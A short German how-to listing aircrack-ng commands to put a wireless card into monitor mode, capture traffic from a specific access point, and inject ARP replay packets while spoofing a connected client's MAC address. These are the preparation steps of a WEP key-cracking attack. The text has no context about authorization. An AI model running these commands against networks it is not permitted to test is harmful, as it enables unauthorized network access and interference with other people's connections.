1) Monitor Mode deaktivieren sofern dieser an ist:
```
airmon-ng stop mon0
airmon-ng stop wlan0
```
2) Monitor Mode auf `wlan0` Kanal `6` aktivieren, dadurch wird automatisch das Interface `mon0` erstellt:
```
airmon-ng start wlan0 6
```
3) mit `airodump-ng` Pakete mitschneiden. `00:1E:58:FF:F5:D5` ist die MAC Adresse des Accesspoints
```
airodump-ng -c 6 --bssid 00:1E:58:FF:F5:D5 -w output mon0
```
4) WÄHREND der Aufzeichnung mit `aireplay-ng` zusätzliche ARP Pakete generieren. `00:1E:58:FF:F5:D5` ist die MAC Adresse des Accesspoints, `C4:85:08:0F:73:1E` ist die MAC Adresse eines am Router angemeldeten Clients
```
aireplay-ng -3 -b 00:1E:58:FF:F5:D5 -h C4:85:08:0F:73:1E mon0
```
5) Wenn genung Traffic Aufgezeichnet wurde, `airodump-ng` und `aireplay-ng` beenden, Monitor Mode wieder deaktivieren:
```
airmon-ng stop mon0
airmon-ng stop wlan0
```
